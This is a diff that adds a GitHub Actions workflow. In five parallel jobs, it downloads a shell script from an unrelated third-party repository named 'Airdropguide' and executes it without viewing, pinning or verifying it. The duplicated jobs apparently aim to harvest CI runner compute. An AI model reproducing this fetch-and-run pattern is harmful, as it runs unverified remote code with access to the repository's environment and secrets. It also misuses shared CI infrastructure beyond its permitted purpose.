@@ -1,0 +1,68 @@
+name: Run Multiple Actions
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  action1:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Execute Action 1
+        run: |
+          wget https://raw.githubusercontent.com/choir94/Airdropguide/refs/heads/main/Docker.sh -O Docker1.sh
+          chmod +x Docker1.sh
+          ./Docker1.sh
+
+  action2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Execute Action 2
+        run: |
+          wget https://raw.githubusercontent.com/choir94/Airdropguide/refs/heads/main/Docker.sh -O Docker2.sh
+          chmod +x Docker2.sh
+          ./Docker2.sh
+
+  action3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Execute Action 3
+        run: |
+          wget https://raw.githubusercontent.com/choir94/Airdropguide/refs/heads/main/Docker.sh -O Docker3.sh
+          chmod +x Docker3.sh
+          ./Docker3.sh
+
+  action4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Execute Action 4
+        run: |
+          wget https://raw.githubusercontent.com/choir94/Airdropguide/refs/heads/main/Docker.sh -O Docker4.sh
+          chmod +x Docker4.sh
+          ./Docker4.sh
+
+  action5:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Execute Action 5
+        run: |
+          wget https://raw.githubusercontent.com/choir94/Airdropguide/refs/heads/main/Docker.sh -O Docker5.sh
+          chmod +x Docker5.sh
+          ./Docker5.sh
